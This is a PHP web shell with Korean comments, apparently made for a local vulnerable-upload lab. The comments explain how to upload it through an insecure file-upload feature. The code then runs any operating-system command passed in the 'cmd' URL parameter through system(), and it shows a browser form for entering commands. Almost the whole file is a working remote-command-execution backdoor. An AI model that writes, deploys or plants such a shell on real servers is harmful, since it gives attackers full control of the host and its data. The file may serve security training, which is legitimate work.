<?php
// 기본 PHP 웹쉘 (Web Shell) 예시
// 취약한 파일 업로드 기능을 통해 본 파일을 서버에 업로드한 후,
// 웹 브라우저에서 이 파일의 물리적 경로(예: /uploads/cmd.php)로 접근하면,
// GET 파라미터 cmd에 전달된 시스템 명령어를 서버 환경(OS)에서 실행할 수 있습니다.
//
// 실제 사용법 예시: http://127.0.0.1:5000/uploads/cmd.php?cmd=whoami
// (이 애플리케이션은 파이썬이므로, 실제 로컬 환경에 PHP-CLI 가 깔려있어야만 동작합니다!!)

if(isset($_GET['cmd'])){
    echo "<pre style='background:black; color:lime; padding:10px;'>";
    echo "Command: " . htmlspecialchars($_GET['cmd']) . "\n\n";
    system($_GET['cmd']);
    echo "</pre>";
} else {
    echo "<h2 style='color:red;'>PHP Web Shell Ready (C99 style logic)</h2>";
    echo "<p>Use <b>?cmd=command</b> to execute system commands directly on the host.</p>";
    echo "<form method='GET'>
            <input type='text' name='cmd' placeholder='Enter OS Command (e.g. dir, whoami)' autofocus size='50'>
            <input type='submit' value='Execute Request'>
          </form>";
}
?>
